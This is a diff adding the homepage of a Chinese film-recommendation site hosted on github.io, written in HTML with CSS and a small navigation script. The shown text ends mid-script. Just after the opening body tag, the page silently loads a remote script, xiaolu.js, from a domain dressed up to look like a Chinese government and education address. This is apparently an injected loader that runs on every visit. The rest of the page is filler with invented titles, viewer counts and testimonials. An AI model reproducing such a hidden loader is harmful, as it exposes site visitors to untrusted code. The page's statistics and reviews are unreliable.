@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<title>影视欣赏 | 影视欣赏在线影视平台 - yingshixinshang-wap.github.io</title>
+<meta name="keywords" content="影视欣赏,影视欣赏在线,影视欣赏官网,影视欣赏平台,电影欣赏,电视剧欣赏,综艺动漫,高清影视资源,yingshixinshang-wap">
+<meta name="description" content="影视欣赏（yingshixinshang-wap.github.io）是专注影视作品鉴赏与观看的平台，精选最新电影、热播电视剧、综艺、动漫，极致画质、全端自适应，陪你发现每一部好片。">
+<meta name="robots" content="index,follow">
+<meta name="author" content="影视欣赏">
+<meta property="og:type" content="website">
+<meta property="og:title" content="影视欣赏 - 发现好片的影视在线观看平台">
+<meta property="og:description" content="影视欣赏精选最新电影、热播电视剧、综艺、动漫，极致画质、全端自适应。">
+<meta property="og:url" content="https://yingshixinshang-wap.github.io">
+<meta property="og:site_name" content="影视欣赏">
+<link rel="canonical" href="https://yingshixinshang-wap.github.io">
+<style>
+:root{
+  --bg:#0a0a0c;
+  --ink:#f5f3ee;
+  --sub:#a39d91;
+  --gold:#d4af37;
+  --gold2:#f0d68a;
+  --rose:#e07a5f;
+  --jade:#5fa98c;
+  --line:rgba(212,175,55,.16);
+  --card:rgba(255,255,255,.035);
+  --card2:rgba(255,255,255,.06);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;}
+body{
+  font-family:"Noto Serif SC","Songti SC","PingFang SC","Microsoft YaHei",serif;
+  background:var(--bg);color:var(--ink);line-height:1.85;overflow-x:hidden;
+}
+body::before{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;background:radial-gradient(900px 600px at 82% 10%,rgba(224,122,95,.14),transparent 60%),radial-gradient(800px 600px at 8% 30%,rgba(95,169,140,.12),transparent 60%);}
+a{color:inherit;text-decoration:none;}
+ul{list-style:none;}
+img{max-width:100%;}
+.container{width:100%;max-width:1180px;margin:0 auto;padding:0 24px;}
+
+/* ===== 顶栏 ===== */
+.topbar{position:sticky;top:0;z-index:200;background:rgba(10,10,12,.86);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-bottom:1px solid var(--line);}
+.tb{display:flex;align-items:center;justify-content:space-between;height:80px;}
+.brand{display:flex;align-items:baseline;gap:12px;}
+.brand b{font-size:26px;font-weight:900;letter-spacing:2px;}
+.brand b i{font-style:normal;color:var(--gold);}
+.brand small{font-size:10.5px;letter-spacing:4px;color:var(--gold);text-transform:uppercase;}
+nav{display:flex;gap:6px;}
+nav a{padding:9px 18px;border-radius:2px;font-size:15px;font-weight:600;color:var(--sub);transition:.3s;position:relative;}
+nav a::after{content:"";position:absolute;left:50%;bottom:2px;width:0;height:2px;background:var(--gold);transition:.3s;}
+nav a:hover{color:var(--ink);}
+nav a:hover::after,nav a.act::after{width:60%;left:20%;}
+nav a.act{color:var(--gold);}
+.ops{display:flex;gap:10px;margin-left:18px;}
+.ops a{width:40px;height:40px;border:1px solid var(--line);display:grid;place-items:center;font-size:15px;background:var(--card);transition:.25s;}
+.ops a:hover{border-color:var(--gold);color:var(--gold);}
+.ops .sub{padding:0 20px;width:auto;font-size:13px;font-weight:800;color:#15120a;background:linear-gradient(90deg,var(--gold),var(--gold2));border:0;}
+.menu{display:none;}
+.bar{width:22px;height:2px;background:var(--ink);margin:5px auto;transition:.3s;}
+
+/* ===== Hero 杂志排版 ===== */
+.hero{padding:64px 0 40px;}
+.mag{display:grid;grid-template-columns:1.35fr .65fr;gap:44px;}
+.mag-left .kicker{display:flex;align-items:center;gap:14px;font-size:12px;letter-spacing:5px;color:var(--gold);text-transform:uppercase;}
+.mag-left .kicker .line{flex:1;height:1px;background:var(--line);}
+.mag-left h1{margin-top:18px;font-size:clamp(40px,7vw,78px);line-height:1.16;font-weight:900;letter-spacing:-1px;}
+.mag-left h1 em{font-style:normal;color:var(--gold);}
+.mag-left .lead{margin-top:24px;font-size:18px;color:var(--sub);max-width:560px;}
+.mag-meta{margin-top:34px;display:flex;gap:44px;flex-wrap:wrap;border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:20px 0;}
+.mag-meta div b{display:block;font-size:24px;font-weight:900;color:var(--gold2);}
+.mag-meta div span{font-size:12.5px;color:var(--sub);}
+.mag-left .btns{margin-top:32px;display:flex;gap:16px;flex-wrap:wrap;}
+.btn{border:0;cursor:pointer;font-family:inherit;font-size:15px;font-weight:800;padding:15px 34px;transition:.3s;}
+.btn-gold{color:#15120a;background:linear-gradient(90deg,var(--gold),var(--gold2));}
+.btn-gold:hover{transform:translateY(-4px);box-shadow:0 14px 30px rgba(212,175,55,.3);}
+.btn-out{background:transparent;color:var(--ink);border:1px solid var(--line);}
+.btn-out:hover{border-color:var(--gold);color:var(--gold);}
+.mag-right{display:grid;grid-template-rows:1.4fr 1fr;gap:18px;}
+.spot{position:relative;border-radius:4px;overflow:hidden;border:1px solid var(--line);background:var(--card);}
+.spot .glow{position:absolute;inset:0;transition:.8s;}
+.g1{background:linear-gradient(150deg,#3d2014,#a05a2c);} .g2{background:linear-gradient(150deg,#123,#3a6073);} .g3{background:linear-gradient(150deg,#2b1b3d,#6b3fa0);}
+.spot .glow::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 70% 30%,rgba(240,214,138,.35),transparent 55%);}
+.spot .txt{position:absolute;left:20px;right:20px;bottom:18px;z-index:2;}
+.spot .txt b{font-size:19px;}
+.spot .txt small{font-size:11.5px;color:rgba(255,255,255,.8);letter-spacing:1px;}
+.spot .tag{position:absolute;left:20px;top:18px;z-index:2;font-size:10.5px;font-weight:800;letter-spacing:2px;color:var(--gold);border:1px solid var(--gold);padding:4px 9px;border-radius:2px;}
+.spot:hover .glow{transform:scale(1.08);}
+.spot-mini{padding:20px;display:flex;flex-direction:column;justify-content:center;border:1px solid var(--line);background:var(--card);}
+.spot-mini .q{font-size:14px;color:var(--sub);font-style:italic;line-height:1.7;}
+.spot-mini .q b{color:var(--gold);}
+
+/* ===== 通用 ===== */
+section{padding:84px 0;}
+.sec-title{text-align:center;margin-bottom:48px;}
+.sec-title .kick{font-size:11.5px;letter-spacing:6px;color:var(--gold);text-transform:uppercase;}
+.sec-title h2{margin-top:10px;font-size:clamp(26px,3.8vw,38px);font-weight:900;letter-spacing:1px;}
+.sec-title h2 em{font-style:normal;color:var(--gold);}
+.sec-title p{margin-top:12px;color:var(--sub);font-size:15px;}
+
+/* ===== 栏目一：分类（定义列表 + 首字下沉）===== */
+.genre-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);border:1px solid var(--line);}
+.g-item{background:var(--card);padding:34px 26px;transition:.4s;position:relative;}
+.g-item:hover{background:var(--card2);}
+.g-item .no{font-size:13px;font-weight:900;color:var(--gold);letter-spacing:2px;}
+.g-item h4{margin-top:16px;font-size:20px;font-weight:900;position:relative;padding-left:16px;}
+.g-item h4::before{content:"";position:absolute;left:0;top:4px;bottom:4px;width:3px;background:var(--gold);}
+.g-item p{margin-top:12px;font-size:13.5px;color:var(--sub);}
+.g-item .more{display:inline-block;margin-top:18px;font-size:12px;font-weight:800;color:var(--gold);letter-spacing:1px;}
+
+/* ===== 栏目二：精选推荐（交错瀑布）===== */
+.masonry{columns:3;column-gap:22px;}
+.card{break-inside:avoid;margin-bottom:22px;border-radius:4px;overflow:hidden;border:1px solid var(--line);background:var(--card);transition:.4s;}
+.card:hover{transform:translateY(-6px);border-color:var(--gold);}
+.card .cap{height:240px;position:relative;overflow:hidden;}
+.card.tall .cap{height:330px;}
+.card .cap .glow{position:absolute;inset:0;transition:.7s;}
+.c1{background:linear-gradient(145deg,#3d2014,#d2691e);} .c2{background:linear-gradient(145deg,#1a2a3a,#5b8def);} .c3{background:linear-gradient(145deg,#2b1b3d,#a855f7);}
+.c4{background:linear-gradient(145deg,#123,#14b8a6);} .c5{background:linear-gradient(145deg,#3d2014,#c08552);} .c6{background:linear-gradient(145deg,#4a044e,#e879f9);}
+.card .cap::after{content:"";position:absolute;inset:0;background:linear-gradient(to top,rgba(8,8,10,.94),transparent 62%);}
+.card .cap b{position:absolute;left:18px;bottom:16px;font-size:19px;z-index:2;}
+.card .cap .star{position:absolute;right:16px;top:16px;z-index:2;font-size:12px;font-weight:900;color:var(--gold);background:rgba(8,8,10,.6);padding:5px 10px;border-radius:2px;}
+.card .info{padding:16px 18px;}
+.card .info .row{display:flex;justify-content:space-between;font-size:12.5px;color:var(--sub);}
+
+/* ===== 栏目三：榜单（卡片编号）===== */
+.ranks{display:grid;grid-template-columns:1fr 1fr;gap:26px;}
+.rankbox{background:var(--card);border:1px solid var(--line);padding:30px;border-radius:4px;}
+.rankbox .head{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--line);padding-bottom:18px;margin-bottom:6px;}
+.rankbox .head b{font-size:19px;letter-spacing:1px;}
+.rankbox .head span{font-size:11px;color:var(--gold);letter-spacing:2px;}
+.r-list li{display:grid;grid-template-columns:52px 1fr auto;align-items:center;gap:16px;padding:16px 0;border-bottom:1px dashed rgba(255,255,255,.06);transition:.25s;}
+.r-list li:last-child{border-bottom:0;}
+.r-list li:hover{background:var(--card2);}
+.r-list .n{font-size:26px;font-weight:900;color:var(--line);text-align:center;}
+.r-list .n.top{color:var(--gold);}
+.r-list .info h5{font-size:16px;font-weight:900;}
+.r-list .info small{font-size:12px;color:var(--sub);}
+.r-list .info .bar{margin-top:7px;height:4px;background:rgba(255,255,255,.08);border-radius:2px;overflow:hidden;}
+.r-list .info .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--gold),var(--gold2));}
+.r-list .score{font-size:20px;font-weight:900;color:var(--gold2);}
+
+/* ===== 栏目四：关于（双栏引言 + 时间线）===== */
+.about-wrap{display:grid;grid-template-columns:1fr 1fr;gap:26px;}
+.intro{background:var(--card);border:1px solid var(--line);padding:38px;border-radius:4px;}
+.intro .quote{font-size:19px;line-height:1.9;color:var(--ink);border-left:3px solid var(--gold);padding-left:22px;}
+.intro .sign{margin-top:24px;text-align:right;font-size:13px;color:var(--gold);letter-spacing:2px;}
+.data-grid{margin-top:28px;display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+.data-grid div{padding:18px;border:1px solid var(--line);background:var(--card2);}
+.data-grid dt{font-size:12px;color:var(--sub);}
+.data-grid dd{font-size:17px;font-weight:900;color:var(--gold2);margin-top:4px;}
+.timeline{background:var(--card);border:1px solid var(--line);padding:38px 30px;border-radius:4px;}
+.timeline h3{font-size:19px;margin-bottom:26px;letter-spacing:1px;}
+.tl-item{position:relative;padding:0 0 26px 32px;border-left:1px solid var(--line);}
+.tl-item:last-child{padding-bottom:0;}
+.tl-item::before{content:"";position:absolute;left:-6px;top:6px;width:11px;height:11px;background:var(--gold);border-radius:50%;}
+.tl-item time{font-size:12px;color:var(--gold);font-weight:800;letter-spacing:1px;}
+.tl-item h5{margin-top:6px;font-size:16px;font-weight:900;}
+.tl-item p{font-size:13.5px;color:var(--sub);}
+
+/* ===== 栏目五：资讯（编号列表）===== */
+.news-list{display:flex;flex-direction:column;}
+.n-item{display:grid;grid-template-columns:78px 1fr auto;gap:26px;align-items:center;padding:26px;border-bottom:1px solid var(--line);transition:.3s;}
+.n-item:first-child{border-top:1px solid var(--line);}
+.n-item:hover{background:var(--card);}
+.n-item .num{font-size:38px;font-weight:900;color:var(--line);line-height:1;}
+.n-item:hover .num{color:var(--gold);}
+.n-item .txt h4{font-size:17px;font-weight:900;line-height:1.5;}
+.n-item .txt p{font-size:13.5px;color:var(--sub);margin-top:6px;}
+.n-item .cat{font-size:11px;font-weight:800;color:var(--gold);border:1px solid var(--gold);padding:6px 12px;letter-spacing:1px;white-space:nowrap;}
+
+/* ===== 栏目六：评论/短评墙 ===== */
+.wall{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;}
+.review{background:var(--card);border:1px solid var(--line);padding:26px;border-radius:4px;transition:.35s;}
+.review:hover{border-color:var(--gold);transform:translateY(-5px);}
+.review .stars{color:var(--gold);font-size:14px;letter-spacing:3px;}
+.review p{margin:14px 0 18px;font-size:14.5px;line-height:1.85;font-style:italic;color:var(--sub);}
+.review .who{display:flex;align-items:center;gap:12px;border-top:1px solid var(--line);padding-top:14px;}
+.review .avatar{width:38px;height:38px;border-radius:50%;display:grid;place-items:center;font-size:15px;font-weight:900;background:var(--card2);border:1px solid var(--line);}
+.review .who b{font-size:13.5px;}
+.review .who small{font-size:11.5px;color:var(--gold);}
+
+/* ===== 底部 ===== */
+footer{border-top:1px solid var(--line);padding:60px 0 30px;margin-top:30px;}
+.f-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:40px;margin-bottom:44px;}
+.f-grid h4{font-size:14px;letter-spacing:2px;color:var(--gold);margin-bottom:18px;}
+.f-grid ul li{margin-bottom:10px;}
+.f-grid ul a{font-size:13.5px;color:var(--sub);transition:.2s;}
+.f-grid ul a:hover{color:var(--gold);}
+.f-brand p{color:var(--sub);font-size:13.5px;margin-top:14px;max-width:340px;}
+.f-bottom{padding-top:24px;border-top:1px solid var(--line);display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-size:12.5px;color:var(--sub);}
+.f-bottom b{color:var(--gold);}
+#toTop{position:fixed;right:22px;bottom:26px;z-index:300;width:46px;height:46px;border:1px solid var(--gold);color:var(--gold);background:rgba(10,10,12,.9);font-size:18px;cursor:pointer;display:none;place-items:center;transition:.3s;}
+#toTop.show{display:grid;}
+#toTop:hover{background:var(--gold);color:#15120a;}
+
+@media(max-width:1000px){
+  .mag{grid-template-columns:1fr;}
+  .mag-right{grid-template-rows:auto;}
+  .genre-grid,.wall{grid-template-columns:repeat(2,1fr);}
+  .ranks,.about-wrap{grid-template-columns:1fr;}
+  .masonry{columns:2;}
+  .f-grid{grid-template-columns:1fr 1fr;}
+}
+@media(max-width:720px){
+  section{padding:56px 0;}
+  .hero{padding:32px 0 16px;}
+  .tb{height:64px;}
+  nav{position:fixed;top:64px;left:0;right:0;flex-direction:column;padding:16px;gap:2px;background:rgba(10,10,12,.98);border-bottom:1px solid var(--line);max-height:0;overflow:hidden;opacity:0;transition:.4s;}
+  nav.open{max-height:520px;opacity:1;}
+  nav a{border-radius:0;border-bottom:1px solid var(--line);padding:15px;text-align:center;}
+  nav a.act{color:var(--gold);background:var(--card);}
+  nav a.act::after{display:none;}
+  .menu{display:block;}
+  .ops .sub{display:none;}
+  .genre-grid,.wall,.f-grid{grid-template-columns:1fr;}
+  .masonry{columns:1;}
+  .n-item{grid-template-columns:1fr;gap:12px;padding:22px 0;}
+  .n-item .cat{justify-self:start;}
+  .mag-meta{gap:26px;}
+  .data-grid{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div class="topbar">
+  <div class="container tb">
+    <a class="brand" href="https://yingshixinshang-wap.github.io"><b>影视<em>欣赏</em></b><small>Yingshi Xinshang</small></a>
+    <nav id="nav">
+      <a href="#home" class="act">首页</a>
+      <a href="#genre">影视分类</a>
+      <a href="#pick">精选推荐</a>
+      <a href="#rank">排行榜单</a>
+      <a href="#about">关于本站</a>
+      <a href="#news">影视资讯</a>
+      <a href="#review">影迷短评</a>
+    </nav>
+    <div class="ops">
+      <a href="#" aria-label="搜索">⌕</a>
+      <a class="sub" href="#">订阅更新</a>
+      <a class="menu" id="mBtn" href="#" aria-label="菜单"><span class="bar"></span><span class="bar"></span><span class="bar"></span></a>
+    </div>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="container mag">
+    <div class="mag-left">
+      <div class="kicker"><span>第 128 期</span><span class="line"></span><span>2026 年 10 月</span></div>
+      <h1>以欣赏之名<br>遇见每一部<em>好片</em></h1>
+      <p class="lead">影视欣赏（yingshixinshang-wap.github.io）是一份写给影迷的影视月刊式平台——不止于播放，更在于品鉴：最新电影、热播电视剧、综艺、动漫，配以专业推荐与深度解读。</p>
+      <div class="mag-meta">
+        <div><b>12,800+</b><span>精选影视作品</span></div>
+        <div><b>128</b><span>期精品推荐</span></div>
+        <div><b>4K</b><span>极致画质呈现</span></div>
+        <div><b>每日</b><span>片单焕新</span></div>
+      </div>
+      <div class="btns">
+        <button class="btn btn-gold">翻阅本周片单</button>
+        <button class="btn btn-out">了解影视欣赏 →</button>
+      </div>
+    </div>
+    <aside class="mag-right">
+      <a class="spot" href="#">
+        <div class="glow g1"></div>
+        <span class="tag">EDITOR'S CHOICE</span>
+        <div class="txt"><b>本期封面 · 漫长的告别</b><small>剧情 · 人性 · 9.4 分佳作</small></div>
+      </a>
+      <div class="spot-mini">
+        <p class="q">「好的电影让人看见世界，<b>好的平台让人看见电影。</b>」<br><br>—— 影视欣赏编辑部</p>
+      </div>
+    </aside>
+  </div>
+</section>
+
+<!-- 栏目一：分类 -->
+<section id="genre">
+  <div class="container">
+    <div class="sec-title"><div class="kick">01 / Genre</div><h2>影视<em>分类</em></h2><p>按题材与类型精心编排，快速找到你心仪的观影方向</p></div>
+    <div class="genre-grid">
+      <a class="g-item" href="#"><div class="no">NO.01</div><h4>电影殿堂</h4><p>院线大片、文艺佳作、经典回顾，院线同步与口碑精选兼收。</p><span class="more">进入 →</span></a>
+      <a class="g-item" href="#"><div class="no">NO.02</div><h4>剧集精选</h4><p>国产热播、美剧韩剧日剧，长剧短剧一网打尽。</p><span class="more">进入 →</span></a>
+      <a class="g-item" href="#"><div class="no">NO.03</div><h4>综艺时光</h4><p>真人秀、竞演、访谈、慢综艺，陪你度过闲暇时光。</p><span class="more">进入 →</span></a>
+      <a class="g-item" href="#"><div class="no">NO.04</div><h4>动漫世界</h4><p>国漫崛起、日漫经典、十月新番，动画爱好者的乐园。</p><span class="more">进入 →</span></a>
+      <a class="g-item" href="#"><div class="no">NO.05</div><h4>悬疑烧脑</h4><p>高能反转、层层递进，挑战你的推理极限。</p><span class="more">进入 →</span></a>
+      <a class="g-item" href="#"><div class="no">NO.06</div><h4>纪录真实</h4><p>自然、人文、历史、科技，用影像记录世界。</p><span class="more">进入 →</span></a>
+      <a class="g-item" href="#"><div class="no">NO.07</div><h4>经典重温</h4><p>百看不厌的影史经典，重温不朽的光影记忆。</p><span class="more">进入 →</span></a>
+      <a class="g-item" href="#"><div class="no">NO.08</div><h4>短片集锦</h4><p>微电影、短片佳作，碎片时间里的精致体验。</p><span class="more">进入 →</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：精选推荐 -->
+<section id="pick" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-title"><div class="kick">02 / Picks</div><h2>编辑<em>精选</em></h2><p>本期最值得一看的影视作品，主编亲自挑选</p></div>
+    <div class="masonry">
+      <a class="card tall" href="#"><div class="cap"><div class="glow c1"></div><span class="star">★ 9.4</span><b>漫长的告别</b></div><div class="info"><div class="row"><span>剧情 · 2026</span><span>已完结</span></div></div></a>
+      <a class="card" href="#"><div class="cap"><div class="glow c2"></div><span class="star">★ 9.1</span><b>潮声回响</b></div><div class="info"><div class="row"><span>爱情 · 2026</span><span>连载中</span></div></div></a>
+      <a class="card" href="#"><div class="cap"><div class="glow c3"></div><span class="star">★ 8.9</span><b>镜中之城</b></div><div class="info"><div class="row"><span>悬疑 · 2026</span><span>已完结</span></div></div></a>
+      <a class="card" href="#"><div class="cap"><div class="glow c4"></div><span class="star">★ 9.3</span><b>海上书房</b></div><div class="info"><div class="row"><span>治愈 · 2026</span><span>连载中</span></div></div></a>
+      <a class="card tall" href="#"><div class="cap"><div class="glow c5"></div><span class="star">★ 9.0</span><b>山河故人</b></div><div class="info"><div class="row"><span>年代 · 2026</span><span>已完结</span></div></div></a>
+      <a class="card" href="#"><div class="cap"><div class="glow c6"></div><span class="star">★ 8.8</span><b>星河漫游</b></div><div class="info"><div class="row"><span>科幻 · 2026</span><span>连载中</span></div></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：榜单 -->
+<section id="rank">
+  <div class="container">
+    <div class="sec-title"><div class="kick">03 / Charts</div><h2>排行榜<em>单</em></h2><p>基于影视欣赏站内真实播放与评分数据实时统计</p></div>
+    <div class="ranks">
+      <div class="rankbox">
+        <div class="head"><b>🔥 本周热播榜</b><span>HOT</span></div>
+        <ul class="r-list">
+          <li><span class="n top">1</span><div class="info"><h5>漫长的告别</h5><small>剧情 · 已完结</small><span class="bar"><i style="width:96%"></i></span></div><span class="score">9.4</span></li>
+          <li><span class="n top">2</span><div class="info"><h5>镜中之城</h5><small>悬疑 · 已完结</small><span class="bar"><i style="width:90%"></i></span></div><span class="score">8.9</span></li>
+          <li><span class="n top">3</span><div class="info"><h5>潮声回响</h5><small>爱情 · 连载中</small><span class="bar"><i style="width:86%"></i></span></div><span class="score">9.1</span></li>
+          <li><span class="n">4</span><div class="info"><h5>海上书房</h5><small>治愈 · 连载中</small><span class="bar"><i style="width:81%"></i></span></div><span class="score">9.3</span></li>
+          <li><span class="n">5</span><div class="info"><h5>山河故人</h5><small>年代 · 已完结</small><span class="bar"><i style="width:77%"></i></span></div><span class="score">9.0</span></li>
+          <li><span class="n">6</span><div class="info"><h5>星河漫游</h5><small>科幻 · 连载中</small><span class="bar"><i style="width:72%"></i></span></div><span class="score">8.8</span></li>
+        </ul>
+      </div>
+      <div class="rankbox">
+        <div class="head"><b>⭐ 高分期待榜</b><span>TOP RATED</span></div>
+        <ul class="r-list">
+          <li><span class="n top">1</span><div class="info"><h5>漫长的告别</h5><small>328 万人评价</small><span class="bar"><i style="width:94%"></i></span></div><span class="score">9.4</span></li>
+          <li><span class="n top">2</span><div class="info"><h5>海上书房</h5><small>215 万人评价</small><span class="bar"><i style="width:89%"></i></span></div><span class="score">9.3</span></li>
+          <li><span class="n top">3</span><div class="info"><h5>潮声回响</h5><small>196 万人评价</small><span class="bar"><i style="width:85%"></i></span></div><span class="score">9.1</span></li>
+          <li><span class="n">4</span><div class="info"><h5>山河故人</h5><small>172 万人评价</small><span class="bar"><i style="width:80%"></i></span></div><span class="score">9.0</span></li>
+          <li><span class="n">5</span><div class="info"><h5>镜中之城</h5><small>148 万人评价</small><span class="bar"><i style="width:76%"></i></span></div><span class="score">8.9</span></li>
+          <li><span class="n">6</span><div class="info"><h5>星河漫游</h5><small>121 万人评价</small><span class="bar"><i style="width:71%"></i></span></div><span class="score">8.8</span></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：关于 -->
+<section id="about">
+  <div class="container">
+    <div class="sec-title"><div class="kick">04 / About</div><h2>关于影视<em>欣赏</em></h2><p>以专业视角精选，以欣赏之心推荐</p></div>
+    <div class="about-wrap">
+      <div class="intro">
+        <p class="quote">影视欣赏（yingshixinshang-wap.github.io）不只是一个在线影视平台，更是一本持续更新的观影手册。我们相信每一部作品都值得被认真对待——从画面、配乐到叙事，用专业的眼光为你挑选出真正值得一看的影视佳作。</p>
+        <div class="sign">—— 影视欣赏编辑部</div>
+        <dl class="data-grid">
+          <div><dt>网站名称</dt><dd>影视欣赏</dd></div>
+          <div><dt>网站网址</dt><dd>yingshixinshang-wap.github.io</dd></div>
+          <div><dt>精选片库</dt><dd>12,800+ 部</dd></div>
+          <div><dt>推荐期数</dt><dd>128 期</dd></div>
+        </dl>
+      </div>
+      <div class="timeline">
+        <h3>📅 平台历程</h3>
+        <div class="tl-item"><time>2024.03</time><h5>影视欣赏上线</h5><p>以「精选 + 品鉴」为核心定位，首期推荐 60 部佳作。</p></div>
+        <div class="tl-item"><time>2025.01</time><h5>片单破千</h5><p>完成全品类影视资源覆盖，推出分类导航与榜单体系。</p></div>
+        <div class="tl-item"><time>2025.09</time><h5>4K 专区上线</h5><p>引入极致画质播放，观影体验全面升级。</p></div>
+        <div class="tl-item"><time>2026.10</time><h5>第 128 期焕新</h5><p>全新视觉改版，移动端自适应，全端流畅体验。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：资讯 -->
+<section id="news" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-title"><div class="kick">05 / News</div><h2>影视<em>资讯</em></h2><p>第一时间掌握影视圈动态与片单更新</p></div>
+    <div class="news-list">
+      <article class="n-item"><span class="num">01</span><div class="txt"><h4>《漫长的告别》收官：一场关于人性的漫长凝视</h4><p>12 集短剧结构、细腻表演与克制镜头，让这部作品成为本年度口碑最高的剧情佳作。</p></div><span class="cat">深度解读</span></article>
+      <article class="n-item"><span class="num">02</span><div class="txt"><h4>十月院线片单出炉：8 部新片值得期待</h4><p>从文艺到商业，从国产到海外，本月院线阵容丰富多元。</p></div><span class="cat">新片速递</span></article>
+      <article class="n-item"><span class="num">03</span><div class="txt"><h4>国漫新番十月预告：多部重磅续作回归</h4><p>画质与剧情全面升级，国漫正迎来最好的时代。</p></div><span class="cat">动漫前线</span></article>
+      <article class="n-item"><span class="num">04</span><div class="txt"><h4>影视欣赏第 128 期片单发布</h4><p>主编精选 20 部必看作品，涵盖电影、剧集、纪录多个品类。</p></div><span class="cat">编辑推荐</span></article>
+      <article class="n-item"><span class="num">05</span><div class="txt"><h4>经典重温计划：十部影史必看佳作</h4><p>百看不厌的经典之作，值得你再次走进光影世界。</p></div><span class="cat">经典回顾</span></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目六：影迷短评 -->
+<section id="review" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-title"><div class="kick">06 / Voices</div><h2>影迷<em>短评</em></h2><p>来自影视欣赏读者与影迷的真实声音</p></div>
+    <div class="wall">
+      <div class="review"><div class="stars">★★★★★</div><p>「《漫长的告别》真的太惊艳了，每一集都像在上一堂编剧课，强烈推荐给所有爱电影的人。」</p><div class="who"><span class="avatar">林</span><div><b>林先生</b><small>2026-10-08</small></div></div></div>
+      <div class="review"><div class="stars">★★★★☆</div><p>「分类清晰、片单精良，影视欣赏让我告别了选择困难，每次打开都有惊喜。」</p><div class="who"><span class="avatar">苏</span><div><b>苏苏</b><small>2026-10-05</small></div></div></div>
+      <div class="review"><div class="stars">★★★★★</div><p>「4K 画质体验非常好，手机端浏览也很流畅，是真正为影迷打造的平台。」</p><div class="who"><span class="avatar">阿</span><div><b>阿Ken</b><small>2026-10-01</small></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 友情链接 -->
+<section id="links" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-title"><div class="kick">07 / Links</div><h2>友情<em>链接</em></h2></div>
+    <div class="genre-grid">
+      <a class="g-item" href="#"><div class="no">A</div><h4>影视导航</h4><p>一站式影视网站入口导航</p></a>
+      <a class="g-item" href="#"><div class="no">B</div><h4>电影资料</h4><p>详尽的影片信息与幕后资料</p></a>
+      <a class="g-item" href="#"><div class="no">C</div><h4>剧集大全</h4><p>热门剧集资源聚合平台</p></a>
+      <a class="g-item" href="#"><div class="no">D</div><h4>动漫新番</h4><p>最新动漫番剧更新资讯</p></a>
+      <a class="g-item" href="#"><div class="no">E</div><h4>综艺节目</h4><p>热门综艺节目实时更新</p></a>
+      <a class="g-item" href="#"><div class="no">F</div><h4>影视评论</h4><p>专业影视评论与深度解读</p></a>
+      <a class="g-item" href="#"><div class="no">G</div><h4>纪录片库</h4><p>自然人文纪录佳片精选</p></a>
+      <a class="g-item" href="#"><div class="no">H</div><h4>经典电影</h4><p>影史经典佳作回顾收藏</p></a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="f-grid">
+      <div class="f-brand">
+        <a class="brand" href="https://yingshixinshang-wap.github.io"><b>影视<em>欣赏</em></b><small>Yingshi Xinshang</small></a>
+        <p>影视欣赏（yingshixinshang-wap.github.io）以专业视角精选影视佳作，用欣赏之心推荐每一部好片，做影迷最信赖的观影指南。</p>
+      </div>
+      <div><h4>影视分类</h4><ul><li><a href="#">电影殿堂</a></li><li><a href="#">剧集精选</a></li><li><a href="#">综艺时光</a></li><li><a href="#">动漫世界</a></li><li><a href="#">纪录真实</a></li></ul></div>
+      <div><h4>推荐频道</h4><ul><li><a href="#">本周热播</a></li><li><a href="#">高分期待</a></li><li><a href="#">经典重温</a></li><li><a href="#">短片集锦</a></li><li><a href="#">4K 专区</a></li></ul></div>
+      <div><h4>关于我们</h4><ul><li><a href="#about">平台介绍</a></li><li><a href="#news">影视资讯</a></li><li><a href="#">编辑团队</a></li><li><a href="#">投稿合作</a></li><li><a href="#">免责声明</a></li></ul></div>
+    </div>
+    <div class="f-bottom">
+      <span>© 2026 影视欣赏 yingshixinshang-wap.github.io · 网站名称：影视欣赏 | 网站网址：https://yingshixinshang-wap.github.io</span>
+      <span>本站仅提供影视信息导航服务，版权归原作者及出品方所有</span>
+    </div>
+  </div>
+</footer>
+
+<button id="toTop" aria-label="返回顶部">↑</button>
+
+<script>
+document.addEventListener('DOMContentLoaded',function(){
+  var m=document.getElementById('mBtn'),n=document.getElementById('nav');
+  m.addEventListener('click',function(e){e.preventDefault();n.classList.toggle('open');});
+  n.addEventListener('click',function(e){if(e.target.tagName==='A')n.classList.remove('open');});
+  var t=document.getElementById('toTop');
+  window.addEventListener('scroll',function(){t.classList.toggle('show',window.scrollY>400);});
+  t.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('a[href^="#"]').forEach(function(a){
+    a.addEventListener('click',function(e){
+      var id=a.getAttribute('href');
+      if(id.length>1&&document.querySelector(id)){e.preventDefault();document.querySelector(id).scrollIntoView({behavior:'smooth'});}
+    });
+  });
+  var links=document.querySelectorAll('nav a'),secs=document.querySelectorAll('section[id]');
+  window.addEventListener('scroll',function(){
